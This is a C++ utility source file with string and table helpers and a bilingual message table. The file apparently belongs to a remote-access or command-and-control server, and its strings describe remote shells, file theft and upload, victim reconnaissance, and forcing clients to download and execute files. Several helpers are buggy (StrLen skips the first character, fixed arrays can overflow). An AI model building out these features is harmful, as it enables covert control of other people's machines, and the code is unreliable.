#include "Misc.hpp"

namespace Misc{
	
	void PrintTable(std::vector<std::string>& vHeaders, std::vector<std::string>& vLines, const char cSplitChar){
		char cTmp[4];
		cTmp[0] = cSplitChar;
		cTmp[1] = '-';
		cTmp[2] = '-';
		cTmp[3] = '\0';
		int iMaxSize = 0, iHead = vHeaders.size(), iLine = vLines.size(), iIt = 0, iIt2 = 0, iTmp = 0, iTmp2 = 0;
		std::vector<std::string> vcTmp;
		for(; iIt<iLine; iIt++){
			iTmp = SplitSize(vLines[iIt], cSplitChar);
			iMaxSize = iTmp > iMaxSize ? iTmp : iMaxSize;
			iMaxSize = iHead > iMaxSize ? iHead : iMaxSize;
		}
		for(iIt=iHead; iIt<iMaxSize; iIt++){
			vHeaders.push_back("--");
		}
		for(iIt=0; iIt<iLine; iIt++){
			iTmp = SplitSize(vLines[iIt], cSplitChar);
			while(iTmp++ < iMaxSize){
				vLines[iIt].append(cTmp);
			}
		}
		int iFieldsSize[100][100];
		int iFields[100];
		for(iIt=0; iIt<iMaxSize; iIt++){
			iFields[iIt] = 0;
			iFieldsSize[0][iIt] = vHeaders[iIt].length();
		}
		for(iIt=1, iIt2 = 0; iIt2<iLine; iIt++, iIt2++){
			strSplit(vLines[iIt2], cSplitChar, vcTmp, 100);
			iTmp = vcTmp.size();
			for(iTmp2=0; iTmp2<iTmp; iTmp2++){
				iFieldsSize[iIt][iTmp2] = int(vcTmp[iTmp2].length()); 
			}
			while(iTmp2<iMaxSize){
				iFieldsSize[iIt][iTmp2++] = 2; //default --
			}
		}
		for(iIt=0; iIt<iLine+1; iIt++){
			for(iIt2=0; iIt2<iMaxSize; iIt2++){
				iFields[iIt2] = iFieldsSize[iIt][iIt2] > iFields[iIt2] ? iFieldsSize[iIt][iIt2] : iFields[iIt2];
			}
		}
		std::string strPadding = "", strSolidBorder = " *", strCutBorder = " .";
		for(iIt=0; iIt<int(vHeaders.size()); iIt++){
			strSolidBorder.append(iFields[iIt] + 3, '=');
			strCutBorder.append(iFields[iIt] + 3, '-');
		}
		strSolidBorder.pop_back();
		strCutBorder.pop_back();
		strSolidBorder.append(1, '*');
		strCutBorder.append(1, '.');
		std::cout<<strSolidBorder<<"\n |" WhiteBk " " CReset;
		
		
		for(iIt=0; iIt<int(vHeaders.size()); iIt++){
			strPadding.erase(strPadding.begin(), strPadding.end());
			iTmp = vHeaders[iIt].length();
			iTmp2 = iFields[iIt] > iTmp ? (iFields[iIt] - iTmp) : (iTmp -iFields[iIt]);
			strPadding.append(iTmp2, ' ');
			std::cout<<WhiteBk<<vHeaders[iIt]<<strPadding<<" " CReset "|";
			if((iIt+1) < int(vHeaders.size())){
				std::cout<<WhiteBk " " CReset;
			} else {
				std::cout<<" ";
			}
		}
		std::cout<<"\n"<<strSolidBorder<<"\n";
		for(iIt=0; iIt<iLine; iIt++){
			std::cout<<" |" BrightBlackBk<<" " CReset;
			strSplit(vLines[iIt], cSplitChar, vcTmp, 100);
			for(iIt2=0; iIt2<int(vcTmp.size()); iIt2++){
				strPadding.erase(strPadding.begin(), strPadding.end());
				iTmp = vcTmp[iIt2].length();
				iTmp2 = iFields[iIt2] > iTmp ? (iFields[iIt2] - iTmp) : (iTmp < iFields[iIt2]);
				strPadding.append(iTmp2, ' ');
				std::cout<<BrightBlackBk<<vcTmp[iIt2]<<strPadding<<" " CReset "|";
				if((iIt2+1) < int(vcTmp.size())){
					std::cout<<BrightBlackBk " " CReset;
				} else {
					std::cout<<" ";
				}
			}
			std::cout<<"\n"<<strSolidBorder<<"\n";
		}
	}
	
	u64 StrToUint(const char *strString){
			u_int uiLen = StrLen(strString);
			u_int uiLen2 = uiLen;
			u64 uiRet = 0;
			for(u_int uiIte0 = 0; uiIte0 < uiLen; uiIte0++){
					u_int uiTlen = 1;
					--uiLen2;
					for(u_int uiIte = 0; uiIte<uiLen2; uiIte++){
						uiTlen *= 10; //decimal  uiTlen *= 8;  octal
					}
					u_int uiT = strString[uiIte0] - 48;
					uiRet += (uiTlen * uiT);
			}
			return uiRet;
	}

	u_int StrLen(const char *strString){
		u_int uiCount = 0;
		while(strString[++uiCount] != '\0');
		return uiCount;
	}
	
	int SplitSize(const std::string& strString, char cDelimiter){
		int istrLen = strString.length(), iIt = 0, iCount = 0;
		for(; iIt<istrLen; iIt++){
			while(strString[iIt] != cDelimiter && strString[iIt] != '\0'){
				iIt++;
			}
			iCount++;
		}
		return iCount;
	}
	
	void strSplit(const std::string& strString, char cDelimiter, std::vector<std::string>& vcOut, int iMax){
		if(vcOut.size() > 0){
			vcOut.erase(vcOut.begin(), vcOut.end());
		}
		int istrLen = strString.length(), iIt = 0, iCounter = 0, iTmp = 0;
		for(; iIt<istrLen; iIt++){
			std::string strTmp = "";
			while(strString[iIt] != cDelimiter && strString[iIt] != '\0'){
				strTmp.append(1, strString[iIt++]);
				iCounter++;
			}
			iCounter = 0;
			vcOut.push_back(strTmp);
			if(++iTmp == iMax){ break; }
			
		}
	}
	
	void strReplaceSingleChar(std::string& cBuffer, char cOld, char cNew){
		u_int uiLen = StrLen(cBuffer.c_str()), iIt = 0;
		for(; iIt<uiLen; iIt++){
			cBuffer[iIt] = cBuffer[iIt] == cOld ? cNew : cBuffer[iIt];
		}
	}
	
	u64 GetFileSize(std::string strFileName){
		std::ifstream strmInputFile(strFileName, std::ios::binary);
		if(!strmInputFile.is_open()){
			return 0;
		}
		std::filebuf *pBuf = strmInputFile.rdbuf();
		u64 uTmp = 0;
		uTmp = pBuf->pubseekoff(0, strmInputFile.end, strmInputFile.in);
		pBuf->pubseekpos(0, strmInputFile.in);
		strmInputFile.close();
		return uTmp;
	}
	
	void strToLower(std::string& strStr){
		for(u_int iIt=0; iIt<strStr.length(); iIt++){
			strStr[iIt] = (strStr[iIt] >= 65 && strStr[iIt] <= 90) ? (strStr[iIt] + 32) : strStr[iIt];
		}
	}
	
	void ProgressBar(u64 value, u64 total){
        int h = 0, hh = 0;
        char pb[101];
        memset(pb, 0, 101);
        int value2 = ((float)value / (float)total) *100;
        for(h=0; h<50; h++){
                for(hh=h; hh<(value2 / 2); hh++, h++){
                        pb[hh] = '#';
                }
                pb[h] = '_';
        }
        pb[50] = '\0';
        std::cout<<'\r'<<pb<<'['<<value2<<"%]";
	}
	
	void Free(char*& Ptr, std::size_t Size){
		if(Ptr != nullptr){
			Size = Size == 0 ? StrLen(Ptr) : Size;
			memset(Ptr, 0, Size);
			delete[] Ptr;
			Ptr = nullptr;
		}
	}
	
	const char* Msg(int iOpt){
		//Spanish
		#ifdef ES
		switch(iOpt){
			case 0:
				return "\n\tNo hay clientes en linea\n";
			case 1:
				return "Enviando ";
			case 2:
				return "No se puede abrir el archivo\n";
			case 3:
				return "Transfrencia confirmada\n";
			case 4:
				return "No confirmado, cancelando transferencia...\n";
			case 5:
				return "No se recibio confirmacion del cliente\n";
			case 6:
				return "No se pudo enviar parte del archivo\n";
			case 7:
				return "\nTransferencia completada!\n";
			case 8:
				return "No se pudo enviar el comando al cliente\n";
			case 9:
				return "Descargando archivo ";
			case 10:
				return "Archivo local: ";
			case 11:
				return "No se pudo descargar el archivo remoto\n";
			case 12:
				return "Tama\u00F1o del archivo: ";
			case 13:
				return "No se puede abrir el archivo ";
			case 14:
				return "\nNo se pudo obtener el tama\u00F1o del archivo remoto\n";
			case 15:
				return "ayuda";
			case 16:
				return "\nAdios\n";
			case 17:
				return "No se pudo invocar la shell\n";
			case 18:
				return "No se pudo leer respuesta del cliente\n";
			case 19:
				return "\n\tUso: shell -c ruta_a_programa\n";
			case 20:
				return "No se pudo obtener informacion del cliente\n";
			case 21:
				return "\n\tUso: info -b (Basico)\n";
			case 22:
				return "descargar";
			case 23:
				return "\n\tUso: descargar -r archivo_remoto\n";
			case 24:
				return "subir";
			case 25:
				return "Nombres de archivo invalidos\n";
			case 26:
				return "\n\tUso: subir -l archivo_local -r archivo_remoto\n";
			case 27:
				return "\n\tEnviado\n";
			case 28:
				return "\n\tUso: httpd -u http://url/archivo -r si|no (Ejecutar)\n";
			case 29:
				return "Enviando comando a ";
			case 30:
				return " clientes\n";
			case 31:
				return "Cliente [";
			case 32:
				return "] correcto\n";
			case 33:
				return "] error\n";
			case 34:
				return "Error leyendo argumentos\n";
			case 35:
				return "\n\tUso: subir -l archivo_local -r archivo_remoto -o windows | linux | *\n";
			case 36:
				return "\n\tUso: httpd -u http://url/archivo -r si|no (Ejecutar) -o windows | linux | *\n";
			case 37:
				return "Actual Usuario:    ";
			case 38:
				return "Sistema Operativo: ";
			case 39:
				return "RAM(Mb):           ";
			case 40:
				return "Modelo";
			case 41:
				return "Arquitectura";
			case 42:
				return "Nombre";
			case 43:
				return "Admin?";
			case 44:
				return "Etiqueta";
			case 45:
				return "Tipo";
			case 46:
				return "Libre";
			case 47:
				return "Total";
			case 48:
				return "\nLista de Usuarios:\n";
			case 49:
				return "\nInformacion de almacenamiento:\n";
			case 50:
				return "No se puede procesar la informacion\n";
			case 51:
				return "Sistema:        ";
			case 52:
				return "Nucleos:        ";
			case 53:
				return "RAM(Mb):        ";
			case 54:
				return "\nActual Usuario: ";
			case 55:
				return "Shell";
			case 56:
				return "\nParticiones del sistema:\n";
			case 57:
				return "Particion";
			case 58:
				return "Tama\u00F1o(GB)";
			case 59:
				return "Error escuchando\n";
			case 60:
				return "No se puede usar el certificado\n";
			case 61:
				return "Llave privada invalida\n";
			case 62:
				return "Nueva conexion";
			case 63:
				return "\nNueva conexion desde ";
			case 64:
				return "Error reservando memoria para el nuevo cliente\n";
			case 65:
				return "d3sc0n0c1d0";
			case 66:
				return "interactuar";
			case 67:
				return "salir\n";
			case 68:
				return "cerrar";
			case 69:
				return "Cliente [";
			case 70:
				return "] no existe o no ya no esta conectado\n";
			case 71:
				return "Cliente se desconecto";
			case 72:
				return "] ";
			case 73:
				return " desconectado\n";
			case 74:
				return "\nShell remota finalizo\n";
			case 75:
				return "El cliente no existe o ya no esta conectado\n";
			case 76:
				return "si";
			case 77:
				return "Si";
			case 78:
				return "No";
			case 79:
				return " EnLinea# ";
			case 80:
				return "salir";
			case 81:
				return "Cpu:            ";
			case 82:
				return "cli   - Commando para interactuar con los clientes\n";
			case 83:
				return "Opciones:\n";
			case 84:
				return "Parametro";
			case 85:
				return "Acerca";
			case 86:
				return "Opciones";
			case 87:
				return "-l,Mostrar clientes conectados";
			case 88:
				return "-a,Comando a correr en el cliente seleccionado,interactuar|cerrar";
			case 89:
				return "-c,Cliente en el cual correr el comando, numero|*";
			case 90:
				return "Ej:   cli -c 0 -a interactuar\n";
			case 91:
				return "      Inicia una sesion interactiva con el cliente 0\n\n";
			case 92:
				return "      cli -c 0 -a cerrar\n";
			case 93:
				return "      Cierra la conexion con el cliente 0 y termina el proceso remoto\n\n";
			case 94:
				return "      cli -c *\n";
			case 95:
				return "      Inicia una sesion interaciva con todos los clientes\n";
			case 96:
				return "Comandos disponibles\n";
			case 97:
				return "Comando";
			case 98:
				return "Parametros";
			case 99:
				return "shell,Inicia una shell interactiva,-c /ruta/a/shell";
			case 100:
				return "descargar,Descarga un archivo remoto,-r /ruta/al/archivo";
			case 101:
				return "subir,Sube un archivo local al cliente,-l C:\\archivo\\local,-r /remoto/archivo";
			case 102:
				return "shell,Inicia una shell interactiva,-c C:\\ruta\\a\\shell.exe";
			case 103:
				return "descargar,Descarga un archivo remoto,-r C:\\remoto\\archivo";
			case 104:
				return "subir,Sube un archivo local al cliente,-l C:\\local\\archivo,-r C:\\remoto\\archivo";
			case 105:
				return "httpd,Fuerza al cliente a descargar un archivo,-u url,-r si|no (Ejecutar)";
			case 106:
				return "info,Obtiene informacion basica del cliente,-b (Basica)";
			case 107:
				return "httpd,Fuerza a los clientes a descargar un archivo,-u url,-r si|no (Ejecutar),-o windows|linux|*";
			case 108:
				return "subir,Sube un archivo a todos los clientes,-l C:\\local\\archivo, -r si|no (Ejecutar),-o windows|linux|*";
			case 109:
				return "\nsalir - Cierra el programa\n";
			case 110:
				return "\nsalir - Regresa a shell principal\n";
			
			default:
				return "?";
		}
		#endif
		//English
		#ifdef EN
		switch(iOpt){
			case 0:
				return "\n\tNo clients online\n";
			case 1:
				return "Sending ";
			case 2:
				return "Unable to open file\n";
			case 3:
				return "Transfer confirmation\n";
			case 4:
				return "Not confirmed, cancel transfer...\n";
			case 5:
				return "Didnt receive confirmation from client\n";
			case 6:
				return "Unable to send file chunk\n";
			case 7:
				return "\nTransfer done!\n";
			case 8:
				return "Unable to send command to client\n";
			case 9:
				return "Downloading file ";
			case 10:
				return "Local file: ";
			case 11:
				return "Unable to download remote file\n";
			case 12:
				return "File size is: ";
			case 13:
				return "Unable to open file ";
			case 14:
				return "Unable to receive remote filesize\n";
			case 15:
				return "help";
			case 16:
				return "\nbye\n";
			case 17:
				return "No se pudo invocar la shell\n";
			case 18:
				return "Unable to read response from client\n";
			case 19:
				return "\n\tUse: shell -c path_to_shell\n";
			case 20:
				return "Unable to retrieve information from client\n";
			case 21:
				return "\n\tUse info -b (Basic)\n";
			case 22:
				return "download";
			case 23:
				return "\n\tUse: download -r remotefilename\n";
			case 24:
				return "upload";
			case 25:
				return "Invalid filenames\n";
			case 26:
				return "\\n\tUse: upload -l local_filename -r remote_filename\n";
			case 27:
				return "\n\tSent\n";
			case 28:
				return "\n\tUse: httpd -u http://site/file -r yes|no (Execute)\n";
			case 29:
				return "Sending command to ";
			case 30:
				return " clients\n";
			case 31:
				return "Client [";
			case 32:
				return "] success\n";
			case 33:
				return "] error\n";
			case 34:
				return "Error parsing arguments\n";
			case 35:
				return "\n\tUse: upload -l local_filename -r yes|no -o windows|linux|*\n";
			case 36:
				return "\n\tUse: httpd -u http://url/file -r yes|no (Execute) -o windows | linux | *\n";
			case 37:
				return "Current User:     ";
			case 38:
				return "Operating System: ";
			case 39:
				return "RAM(Mb):          ";
			case 40:
				return "Model";
			case 41:
				return "Arquitecture";
			case 42:
				return "UserName";
			case 43:
				return "Admin?";
			case 44:
				return "Label";
			case 45:
				return "Type";
			case 46:
				return "Free";
			case 47:
				return "Total";
			case 48:
				return "\nUser List:\n";
			case 49:
				return "\nStorage Information:\n";
			case 50:
				return "Unable to parse info\n";
			case 51:
				return "System:       ";
			case 52:
				return "Cores:        ";
			case 53:
				return "RAM(Mb):      ";
			case 54:
				return "\nCurrent User: ";
			case 55:
				return "Shell";
			case 56:
				return "\nSystem partition:\n";
			case 57:
				return "Partition";
			case 58:
				return "Size(GB)";
			case 59:
				return "Error listening\n";
			case 60:
				return "Unable to use certificate\n";
			case 61:
				return "Invalid private key\n";
			case 62:
				return "New connection";
			case 63:
				return "\nNew connection from ";
			case 64:
				return "Error allocating memory for new client\n";
			case 65:
				return "unkn0w";
			case 66:
				return "interact";
			case 67:
				return "exit\n";
			case 68:
				return "close";
			case 69:
				return "Client [";
			case 70:
				return "] doesnt exist or its not connected anymore\n";
			case 71:
				return "Client disconnected";
			case 72:
				return "] ";
			case 73:
				return " disconnected\n";
			case 74:
				return "\nRemote shell ends\n";
			case 75:
				return "Client doesnt exist or its not connected anymore\n";
			case 76:
				return "yes";
			case 77:
				return "Yes";
			case 78:
				return "No";
			case 79:
				return " online# ";
			case 80:
				return "exit";
			case 81:
				return "Cpu:          ";
			case 82:
				return "cli  - Command to interact with clients\n";
			case 83:
				return "Options:\n";
			case 84:
				return "Parameter";
			case 85:
				return "About";
			case 86:
				return "Options";
			case 87:
				return "-l,Show connected clients";
			case 88:
				return "-a,Action to run on selected client,interact|close";
			case 89:
				return "-c,Client to run selected action, number|*";
			case 90:
				return "Ex:   cli -c 0 -a interact\n";
			case 91:
				return "      Start an interactive session with client 0\n\n";
			case 92:
				return "      cli -c 0 -a close\n";
			case 93:
				return "      Close connection with client 0 and terminate remote process\n\n";
			case 94:
				return "      cli -c *\n";
			case 95:
				return "      Start interactive session with all connected clients\n";
			case 96:
				return "Available commands\n";
			case 97:
				return "Command";
			case 98:
				return "Parameters";
			case 99:
				return "shell,Start interactive shell with client,-c /path/to/shell";
			case 100:
				return "download,Download a remote file,-r /path/to/file";
			case 101:
				return "upload,Upload a localfile to client,-l C:\\local\\file,-r /remote/path";
			case 102:
				return "shell,Start interactive shell with client,-c C:\\path\\to\\shell.exe";
			case 103:
				return "download,Downlaod a remote file,-r C:\\remote\\file";
			case 104:
				return "upload,Upload a local file to client,-l C:\\local\\file,-r C:\\remote\\file";
			case 105:
				return "httpd,Force client to download a file from http(s) server,-u url,-r yes|no (Exec)";
			case 106:
				return "info,Retrieve basic info from client,-b (Basic)";
			case 107:
				return "httpd,Force clients to download a file,-u url,-r no|yes (Exec),-o windows|linux|*";
			case 108:
				return "upload,Upload a file to all clients,-l C:\\local\\file, -r yes|no (Exec),-o windows|linux|*";
			case 109:
				return "\nexit - Close the program\n";
			case 110:
				return "\nexit - Exit to main shell\n";
			default:
				return "?";
		}
		#endif
	}
}
